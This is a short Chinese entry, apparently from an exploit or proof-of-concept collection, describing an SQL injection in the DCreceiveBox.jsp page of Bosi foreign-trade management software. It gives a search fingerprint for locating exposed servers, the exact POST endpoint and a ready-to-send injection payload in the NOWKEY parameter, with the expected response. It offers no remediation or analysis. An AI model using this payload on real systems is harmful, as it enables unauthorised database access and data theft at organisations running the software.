# 博斯外贸管理软件DCreceiveBox.jsp存在SQL注入漏洞

博斯外贸管理软件 ｜ SQL注入 ｜ —
- **指纹**：`title="欢迎使用 博斯软件"`
- **请求**：`POST /crm/module/DCreceiveBox.jsp HTTP/1.1`

**Payload**
```
SAVE=1&setCustom=&NOWKEY='and+1=@@version--
```
- **响应特征**：200